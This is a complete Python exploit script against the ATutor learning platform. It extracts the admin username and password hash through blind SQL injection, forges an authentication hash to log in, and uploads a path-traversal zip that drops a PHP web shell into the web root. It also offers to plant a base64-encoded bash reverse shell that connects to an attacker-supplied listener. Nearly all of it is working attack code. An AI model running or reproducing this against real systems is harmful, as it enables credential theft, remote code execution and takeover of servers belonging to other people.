#!/usr/bin/python3

import argparse

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import hashlib
import base64

import zipfile
import random, string
from io import BytesIO

from colorama import init as colorama_init
from colorama import Fore
from colorama import Style


splash = f"""
{Style.BRIGHT}{Fore.BLUE}▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▌
▐                                                                                              ▌
▐{Fore.WHITE}      █████╗ ████████╗██╗   ██╗████████╗ ██████╗ ██████╗ ██████╗ ██████╗  ██████╗███████╗     {Fore.BLUE}▌
▐{Fore.WHITE}     ██╔══██╗╚══██╔══╝██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗╚════██╗██╔══██╗██╔════╝██╔════╝     {Fore.BLUE}▌
▐{Fore.WHITE}     ███████║   ██║   ██║   ██║   ██║   ██║   ██║██████╔╝ █████╔╝██████╔╝██║     █████╗       {Fore.BLUE}▌
▐{Fore.WHITE}     ██╔══██║   ██║   ██║   ██║   ██║   ██║   ██║██╔══██╗██╔═══╝ ██╔══██╗██║     ██╔══╝       {Fore.BLUE}▌
▐{Fore.WHITE}     ██║  ██║   ██║   ╚██████╔╝   ██║   ╚██████╔╝██║  ██║███████╗██║  ██║╚██████╗███████╗     {Fore.BLUE}▌
▐{Fore.WHITE}     ╚═╝  ╚═╝   ╚═╝    ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝     {Fore.BLUE}▌
▐                                      {Fore.WHITE}Built by twopoint{Fore.BLUE}                                       ▌
▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌{Style.RESET_ALL}
"""

def sqliGetSecret(ip):

    # Get boolean response lengths
    
    try:
        # Negative response length
        query = "'/**/and/**/1=2/**/and/**/'" # SELECT * FROM members M WHERE (first_name LIKE '%%') AND 1=2#...
        r = requests.get(f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={query}", timeout=30)
        negLength = int(r.headers['Content-Length'])

        # Positive response length
        query = "'/**/or/**/1=1/**/or/**/'" # SELECT * FROM members M WHERE (first_name LIKE '%%') OR 1=1#...
        r = requests.get(f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={query}", timeout=30)
        posLength = int(r.headers['Content-Length'])
    except:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Could not request user search. Either path is incorrect or target is not vulnerable.")
        exit()

    # Need to retrieve usernames before secrets or we can't login
    print(f"{Fore.YELLOW}[~]{Style.RESET_ALL} Acquiring username...")
    user = ""
    userFound = False

    while userFound != True:
        for char in range(32,126):
            query = f"'/**/and/**/(ascii(substring((SELECT/**/login/**/FROM/**/AT_members/**/where/**/member_id/**/=/**/1),{len(user) + 1},1)))={char}/**/or/**/'"
            r = requests.get(f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={query}")
            if int(r.headers['Content-Length']) == posLength:
                user += chr(char)
                print(f"\r    Username: " + user, end="")
                break
            if char == 125 and int(r.headers['Content-Length']) == negLength:
                userFound = True
                print()
                break
    
    # Find secret for username
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Found user {user}! Retrieving secret now - this may take a while...")
    secret = ""
    secretFound = False

    while secretFound != True:
        for char in range(32,126):
            query = f"'/**/and/**/(ascii(substring((SELECT/**/password/**/FROM/**/AT_members/**/where/**/login/**/=/**/'{user}'),{len(secret) + 1},1)))={char}/**/or/**/'"
            r = requests.get(f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={query}")
            if int(r.headers['Content-Length']) == posLength:
                secret += chr(char)
                print(f"\r    {user}'s secret: " + secret, end="")
                break
            if char == 125 and int(r.headers['Content-Length']) == negLength:
                secretFound = True
                break

    print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Found {user}'s secret: {secret}")
    
    return user, secret


def getLogin(user, secret, ip):

    # Forge auth hash from token and secret
    token = "twopoint"
    authHash = secret + token
    authHash = authHash.encode(encoding = 'UTF-8')
    authHash = hashlib.sha1(authHash).hexdigest()

    # Attempt login
    print(f"{Fore.YELLOW}[~]{Style.RESET_ALL} Attempting login...")
    url = f"http://{ip}/ATutor/login.php"
    d = {
        "form_password_hidden" : authHash,
        "form_login": user,
        "submit": "Login",
        "token" : token
    }
    authSession = requests.Session()
    r = authSession.post(url, data=d,allow_redirects=True)

    # Check for success and return session
    if "Create Course: My Start Page" in r.text or "My Courses: My Start Page" in r.text:
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Authentication successful!")
    else:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Authentication unsuccessful. Check login URL and verify manually.")
        exit()

    return authSession

def createPayload(payload='<?php SYSTEM($_GET["cmd"]); ?>'):

    # Open zip
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)

    # Creating webshell with random name
    shellName = ''.join(random.choice(string.ascii_lowercase) for i in range(10))

    z.writestr(f'../../../../../../../../../../../../../../var/www/html/ATutor/mods/{shellName}.phtml', str(payload))
    z.writestr('imsmanifest.xml', 'twopointmadethis') # Malformed XML to write to disk
    z.close()
    zip = open('atutor2rce.zip','wb')
    zip.write(f.getvalue())
    zip.close()

    return shellName

def uploadShell(session, ip):

    # Generate payload first
    print(f"{Fore.YELLOW}[~]{Style.RESET_ALL} Generating payload...")
    try:
        shellName = createPayload()
    except:
        print(f"{Fore.RED}[!]{Style.RESET_ALL} Payload generation failed!")
        exit()
    
    # We need to identify a valid course ID that the user is enrolled in and set that to the active course for the server session cookie

    url = f"http://{ip}/ATutor/users/index.php"
    r = session.get(url)

    # Parse homepage response for a valid course ID
    start = r.text.find('<a href="bounce.php?course=') + len('<a href="bounce.php?course=')
    end = r.text.find(">",start)
    courseID = r.text[start:end-1]

    # Set server cookie for course ID
    url = f"http://{ip}/ATutor/bounce.php?course={courseID}"
    r = session.get(url)

    # Upload shell
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Payload generated! Uploading now...")
    
    url = f"http://{ip}/ATutor/mods/_standard/tests/import_test.php"
    payload = open('atutor2rce.zip','rb')
    
    multipart_data = MultipartEncoder(
        fields={
            "file" : ("atutor2rce.zip", payload, "application/zip"),
            "submit_import" : "Import"
        }
    )

    req = session.post(url, data=multipart_data, headers={'Content-Type' : multipart_data.content_type})

    # Check if shell exists
    shellUrl = f"http://{ip}/ATutor/mods/{shellName}.phtml"
    r = session.get(shellUrl+"?cmd=id")
    
    if "uid=" in r.text:
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Shell successfully uploaded at {shellUrl}")

    return shellName, session

def getRCE(session, ip):

    # Prompt for rev shell
    c = ""
    while c.lower() != 'y' and c.lower() != 'n':
        print(f"{Fore.MAGENTA}[?]{Style.RESET_ALL} Would you like to upload a reverse shell? [Y/N]: ", end = " ")
        c = input()

    # Get params and upload revshell
    if c.lower() == 'y':
        print(f"{Fore.MAGENTA}[?]{Style.RESET_ALL} Listener IP: ", end=" ")
        listenIP = input()
        print(f"{Fore.MAGENTA}[?]{Style.RESET_ALL} Listener Port: ", end=" ")
        listenPort = input()
        
        # Base64 piped to bash reverse shell method
        payload = f"bash -i >& /dev/tcp/{listenIP}/{listenPort} 0>&1"
        payload = base64.b64encode(bytes(payload,'utf-8'))
        payload = payload.decode('utf-8')
        payload = f'<?php SYSTEM("echo {payload} | base64 -d | bash"); ?>'
        shellName = createPayload(payload)

        # Need to regenerate payload
        url = f"http://{ip}/ATutor/mods/_standard/tests/import_test.php"
        payload = open('atutor2rce.zip','rb')
        
        multipart_data = MultipartEncoder(
            fields={
                "file" : ("atutor2rce.zip", payload, "application/zip"),
                "submit_import" : "Import"
            }
        )
        
        req = session.post(url, data=multipart_data, headers={'Content-Type' : multipart_data.content_type})

        # Trigger shell
        shellUrl = f"http://{ip}/ATutor/mods/{shellName}.phtml"
        try:
            r = session.get(shellUrl, timeout=3)
        except:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Reverse shell trigger uploaded to {shellUrl}. Check your listener!")
            return

    else:
        print(f"Program exiting...")
        exit()

    return

def main():

    print(splash)

    # Parser
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="IP of ATutor server", type=str)
    args = parser.parse_args()

    # Verify server is alive
    try:
        r = requests.get(f"http://{args.ip}", timeout=30)
    except:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Server did not respond. Exiting program.")
        exit()
    

    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Server responded. Starting exploit.")

    # Retrieve user and secret
    user, secret = sqliGetSecret(args.ip)
    
    # Authenticate as admin with forged token and retrieve session cookies
    session = getLogin(user, secret, args.ip)

    # Set server courseID session cookie and upload webshell package
    shellName, session = uploadShell(session, args.ip)

    # Interact with webshell or spawn reverse shell
    getRCE(session, args.ip)


if __name__ == "__main__":
    main()
